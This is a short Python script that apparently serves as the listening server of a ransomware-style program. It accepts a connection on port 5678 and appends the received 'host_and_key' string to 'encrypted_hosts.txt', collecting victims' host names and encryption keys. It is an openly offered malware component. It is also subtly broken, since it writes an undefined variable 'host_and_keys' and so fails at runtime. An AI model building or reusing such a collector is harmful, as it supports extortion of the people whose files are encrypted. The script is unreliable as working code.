import socket

IP_ADDRESS = '192.168.1.0' # u should open a persistent server
PORT = 5678

print('Creating Socket')

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS, PORT))
    print('Connections?')
    s.listen(1)
    conn, addr = s.accept()
    print(f'{addr} Connected')
    
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_keys+'\n')
            break
        print("Connection Success and Closed")       
